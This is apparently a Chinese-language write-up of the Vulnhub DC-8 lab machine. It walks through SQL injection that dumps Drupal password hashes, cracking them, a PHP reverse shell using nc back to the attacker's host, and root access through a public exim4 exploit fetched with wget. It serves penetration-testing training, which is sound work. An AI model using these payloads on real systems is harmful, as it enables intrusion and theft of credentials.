---
title: Vulnhub-DC-8
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-8

> https://www.vulnhub.com/entry/dc-8,367/
> 

描述：在 Linux 上安装和配置双因素身份验证是否可以防止 Linux 服务器被利用

## 端口扫描主机发现

1. 探测存活主机，`179`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24                 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 20:46 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00031s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00024s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.179
    Host is up (0.00027s latency).
    MAC Address: 00:0C:29:15:00:FB (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00033s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口
    
    ```php
    map -sT -min-rate 10000 -p- 192.168.75.179
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 20:47 CST
    Nmap scan report for 192.168.75.179
    Host is up (0.00096s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:15:00:FB (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22 192.168.75.179    
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 20:47 CST
    Nmap scan report for 192.168.75.179
    Host is up (0.00048s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
    80/tcp open  http    Apache httpd
    MAC Address: 00:0C:29:15:00:FB (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.179
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 20:48 CST
    Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 0.00% done
    Nmap scan report for 192.168.75.179
    Host is up (0.00055s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.179
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.179:80/node/3
    |     Form id: webform-client-form-3
    |_    Form action: /node/3
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /rss.xml: RSS or Atom feed
    |   /robots.txt: Robots file
    |   /UPGRADE.txt: Drupal file
    |   /INSTALL.txt: Drupal file
    |   /INSTALL.mysql.txt: Drupal file
    |   /INSTALL.pgsql.txt: Drupal file
    |   /CHANGELOG.txt: Drupal v1
    |   /: Drupal version 7 
    |   /README.txt: Interesting, a readme.
    |   /0/: Potentially interesting folder
    |_  /user/: Potentially interesting folder
    MAC Address: 00:0C:29:15:00:FB (VMware)
    ```
    

## web渗透

1. 访问主页这次依旧是`Drupal` ，织纹识别显示版本是`Drupal 7`
    
    ![image.png](image%2042.png)
    
    文中内容是
    
    ```python
    
    Very Important Message
    
    There will be disruptions to this site over the next few weeks while we resolve a few outstanding issues.
    
    We apologise for any inconvenience.
    ```
    
    `Contact Us`存在表单，填完后输出：`Thanks for taking the time to contact us. We shall be in contact soon.` 好像也没啥用
    
2. 扫描目录看看，没什么实质性的东西
    
    ```python
    dirsearch -u 192.168.75.179 -x 403,404
    //
    [20:49:49] Starting:                                                                                                                                                                                             
    [20:50:35] 200 -   33KB - /CHANGELOG.txt                                    
    [20:50:37] 200 -  769B  - /COPYRIGHT.txt                                    
    [20:50:53] 301 -  239B  - /includes  ->  http://192.168.75.179/includes/    
    [20:50:54] 200 -  868B  - /INSTALL.mysql.txt                                
    [20:50:54] 200 -    1KB - /install.php                                      
    [20:50:54] 200 -  842B  - /INSTALL.pgsql.txt                                
    [20:50:54] 200 -    1KB - /install.php?profile=default                      
    [20:50:55] 200 -    6KB - /INSTALL.txt                                      
    [20:50:59] 200 -    7KB - /LICENSE.txt                                      
    [20:51:02] 200 -    2KB - /MAINTAINERS.txt                                  
    [20:51:05] 301 -  235B  - /misc  ->  http://192.168.75.179/misc/            
    [20:51:05] 301 -  238B  - /modules  ->  http://192.168.75.179/modules/      
    [20:51:08] 200 -    2KB - /node                                             
    [20:51:18] 301 -  239B  - /profiles  ->  http://192.168.75.179/profiles/    
    [20:51:20] 200 -    2KB - /README.txt                                       
    [20:51:21] 200 -  744B  - /robots.txt                                       
    [20:51:22] 301 -  238B  - /scripts  ->  http://192.168.75.179/scripts/      
    [20:51:26] 301 -  236B  - /sites  ->  http://192.168.75.179/sites/          
    [20:51:26] 200 -  129B  - /sites/all/libraries/README.txt                   
    [20:51:26] 200 -    0B  - /sites/example.sites.php                          
    [20:51:26] 200 -  545B  - /sites/all/themes/README.txt                      
    [20:51:27] 200 -  715B  - /sites/all/modules/README.txt                     
    [20:51:27] 200 -  431B  - /sites/README.txt                                 
    [20:51:34] 301 -  237B  - /themes  ->  http://192.168.75.179/themes/        
    [20:51:37] 200 -    3KB - /UPGRADE.txt                                      
    [20:51:37] 200 -    2KB - /user                                             
    [20:51:37] 200 -    2KB - /user/                                            
    [20:51:38] 200 -    2KB - /user/login/                                      
    [20:51:40] 200 -  177B  - /views/ajax/autocomplete/user/a                   
    [20:51:42] 200 -    2KB - /web.config                                       
    [20:51:46] 200 -   42B  - /xmlrpc.php                                              
    ```
    
3. 当我们点击左边`Details`栏位的链接的URL是`/?nid=1` 可能存在`SQL`注入
    - 输入`1'` ,惊喜的发现报错了
        
        ```python
        # http://192.168.75.179/?nid=1'
        ```
        
        ![image.png](image%2043.png)
        
        爆出了`SQL`语句 ： `SELECT title FROM node WHERE nid = 1`
        
    - 继续深入注入（尝试手工注入）
        
        ```python
        # 显示位
        /?nid=0 union select 1
        # 用户，dbuser@localhost
        /?nid=0 union select user()
        # 当前数据库，d7db
        /?nid=0 union select database()
        # 版本，10.1.26-MariaDB-0+deb9u1
        /?nid=0 union select version()
        ```
        
    - 表中的数据库
        
        ```python
        /?nid=0 union select group_concat(table_name) from information_schema.tables where table_schema = database()
        ```
        
        ```python
        actions,authmap,batch,block,block_custom,block_node_type,block_role,blocked_ips,
        cache,cache_block,cache_bootstrap,cache_field,cache_filter,cache_form,cache_image,
        cache_menu,cache_page,cache_path,cache_views,cache_views_data,ckeditor_input_format,
        ckeditor_settings,ctools_css_cache,ctools_object_cache,date_format_locale,
        date_format_type,date_formats,field_config,field_config_instance,field_data_body,
        field_data_field_image,field_data_field_tags,field_revision_body,field_revision_field_image,
        field_revision_field_tags,file_managed,file_usage,filter,filter_format,flood,history,
        image_effects,image_styles,menu_custom,menu_links,menu_router,node,node_access,
        node_revision,node_type,queue,rdf_mapping,registry,registry_file,role,role_permission,
        search_dataset,search_index,search_node_links,search_total,semaphore,sequences,
        sessions,shortcut_set,shortcut_set_users,site_messages_table,system,taxonomy_index,
        taxonomy_term_data,taxonomy_term_hierarchy,taxonomy_vocabulary,url_alias,users,
        users_roles,variable,views_display,views
        ```
        
        我们感兴趣的只有`users`
        
    - `users`表的列
        
        ```python
        /?nid=0 union select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users'
        ```
        
        仅需要`name`，`pass`
        
        ```python
        uid,name,pass,mail,theme,signature,signature_format,created,access,login,status,timezone,language,picture,init,data
        ```
        
    - `users`表的数据
        
        ```python
        /?nid=0 union select group_concat('~',name,':',pass,'~') from users
        ```
        
        ```python
        ~:~,
        ~admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z~,
        ~john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF~
        ```
        
        `users`表的所有数据
        
        ```python
        +-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+
        | uid | init                | mail                  | pass                                                    | login      | theme   | data                                                                                                                                                                        | name    | access     | created    | picture | status   | timezone           | signature | language   | signature_format |
        +-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+
        | 0   | <blank>             | <blank>               | <blank>                                                 | 0          | <blank> | NULL                                                                                                                                                                        | <blank> | 0          | 0          | 0       | 0        | NULL               | <blank>   | <blank>    | NULL             |
        | 1   | dc8blah@dc8blah.org | dcau-user@outlook.com | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | 1567766626 | <blank> | a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}                                                                                                                                  | admin   | 1567766818 | 1567489015 | 0       | 1        | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
        | 2   | john@blahsdfsfd.org | john@blahsdfsfd.org   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | 1567497783 | <blank> | a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"ckeditor_auto_lang";s:1:"t";} | john    | 1567498512 | 1567489250 | 0       | 1        | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
        +-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+
        ```
        
4. 随即将密码放到`john`爆破，密码存在`pass`文件里
    
    ```python
    # john pass 
    Using default input encoding: UTF-8
    Loaded 2 password hashes with 2 different salts (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
    Cost 1 (iteration count) is 32768 for all loaded hashes
    Will run 8 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/share/john/password.lst
    turtle           (?)     
    ```
    
    一段时间后爆破出`turtle` ,去尝试登陆后台
    
5. 最后用户`john`使用密码`turtle` 进入了后台

## 利用后台

1. 进入后台我们直接添加内容输入一句话木马尝试，发现代码没有解析，继续寻找可利用点
    
    ![image.png](image%2044.png)
    
2. 在`My account` 里面可以上传头像，想着有没有存在包含漏洞，很可惜图片保存后是绝对路径
3. 在`Content`里面选择`Contact Us` 然后`edit` ,如图存在疑似可以插入`PHP`代码的地方
    
    ![image.png](image%2045.png)
    
    可以看到内容是我们填完`Contact Us` 的表单后出现的字符，我们尝试它修改为反弹shell代码
    
    ```python
    <?php system('nc 192.168.75.151 1234 -e /bin/bash'); ?>
    ```
    
    注意`Text Fotmat` 修改为`PHP code` ，同时`kali`开启监听
    
    ```python
    nc -lvp 1234                          
    listening on [any] 1234 ...
    ```
    
    填写表单（随便输点东西），提交，网页一直加载（有说法），返回`kali`看，反弹`shell`成功
    

## 提权

1. 查看权限
    
    ```python
    $ whoami
    www-data
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ uname -a
    Linux dc-8 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux
    ```
    
2. 寻找提权的点
    - SUID
        
        ```python
        $ find / -perm -u=s -type f 2>/dev/null
        //
        /usr/bin/chfn
        /usr/bin/gpasswd
        /usr/bin/chsh
        /usr/bin/passwd
        /usr/bin/sudo
        /usr/bin/newgrp
        /usr/sbin/exim4
        /usr/lib/openssh/ssh-keysign
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /bin/ping
        /bin/su
        /bin/umount
        /bin/mount
        ```
        
        看到`exim4` ，尝试提权
        
3. 尝试`exim4`提权
    - 查看版本，`4.89`
        
        ```python
        $ exim4 --version
        //
        Exim version 4.89 #2 built 14-Jun-2017 05:03:07
        Copyright (c) University of Cambridge, 1995 - 2017
        (c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017
        Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
        Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open
        Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
        Authenticators: cram_md5 plaintext
        Routers: accept dnslookup ipliteral manualroute queryprogram redirect
        Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
        Fixed never_users: 0
        Configure owner: 0:0
        Size of off_t: 8
        Configuration file is /var/lib/exim4/config.autogenerated
        ```
        
    - 搜索漏洞
        
        ```python
        searchsploit Exim     
        --------------------------------------------------------------------------- ---------------------------------
         Exploit Title                                                             |  Path
        --------------------------------------------------------------------------- ---------------------------------
        Dovecot with Exim - 'sender_address' Remote Command Execution              | linux/remote/25297.txt
        Exim - 'GHOST' glibc gethostbyname Buffer Overflow (Metasploit)            | linux/remote/36421.rb
        Exim - 'perl_startup' Local Privilege Escalation (Metasploit)              | linux/local/39702.rb
        Exim - 'sender_address' Remote Code Execution                              | linux/remote/25970.py
        Exim 3.x - Format String                                                   | linux/local/20900.txt
        Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation              | linux/local/40054.c
        Exim 4.41 - 'dns_build_reverse' Local Buffer Overflow                      | linux/local/756.c
        Exim 4.41 - 'dns_build_reverse' Local Read Emails                          | linux/local/1009.c
        Exim 4.42 - Local Privilege Escalation                                     | linux/local/796.sh
        Exim 4.43 - 'auth_spa_server()' Remote                                     | linux/remote/812.c
        Exim 4.63 - Remote Command Execution                                       | linux/remote/15725.pl
        Exim 4.84-3 - Local Privilege Escalation                                   | linux/local/39535.sh
        Exim 4.87 - 4.91 - Local Privilege Escalation                              | linux/local/46996.sh
        Exim 4.87 / 4.91 - Local Privilege Escalation (Metasploit)                 | linux/local/47307.rb
        Exim 4.87 < 4.91 - (Local / Remote) Command Execution                      | linux/remote/46974.txt
        Exim 4.89 - 'BDAT' Denial of Service                                       | multiple/dos/43184.txt
        exim 4.90 - Remote Code Execution                                          | linux/remote/45671.py
        Exim < 4.86.2 - Local Privilege Escalation                                 | linux/local/39549.txt
        Exim < 4.90.1 - 'base64d' Remote Code Execution                            | linux/remote/44571.py
        Exim Buffer 1.6.2/1.6.51 - Local Overflow                                  | unix/local/20333.c
        Exim ESMTP 4.80 - glibc gethostbyname Denial of Service                    | linux/dos/35951.py
        Exim Internet Mailer 3.35/3.36/4.10 - Format String                        | linux/local/22066.c
        Exim Sender 3.35 - Verification Remote Stack Buffer Overrun                | linux/remote/24093.c
        Exim4 < 4.69 - string_format Function Heap Buffer Overflow (Metasploit)    | linux/remote/16925.rb
        PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                   | php/webapps/42221.py
        --------------------------------------------------------------------------- ---------------------------------
        ```
        
        可以看到 `46996.sh` 是比较合适的，我们将它拉取下来，然后下载到靶机
        
    - 查看脚本内容，看食用方法
        
        ```python
        # Usage (netcat method):
        # $ id
        # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
        # $ ./raptor_exim_wiz -m netcat
        ```
        
    - 将文件放到`/tmp`目录下，给予文件执行权限
        
        ```python
        cd /tmp
        wget 192.168.75.151/46996.sh
        chmod u+x 46996.sh
        ```
        
        根据食用方法执行文件
        
        ```python
        ./46996.sh -m netcat
        ```
        
    - 提权成功
        
        ```python
        whoami
        root
        ```
        
    - 读取`flag`内容
        
        ```python
        # cat flag.txt
        //
        Brilliant - you have succeeded!!!
        
        888       888          888 888      8888888b.                             888 888 888 888
        888   o   888          888 888      888  "Y88b                            888 888 888 888
        888  d8b  888          888 888      888    888                            888 888 888 888
        888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
        888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
        88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
        8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
        888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888
        
        Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
        who have provided feedback, and all those who have taken the time to complete these little
        challenges.
        
        I'm also sending out an especially big thanks to:
        
        @4nqr34z
        @D4mianWayne
        @0xmzfr
        @theart42
        
        This challenge was largely based on two things:
        
        1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
        2. A suggestion from @theart42
        
        The answer to that question is...
        
        If you enjoyed this CTF, send me a tweet via @DCAU7.
        
        ```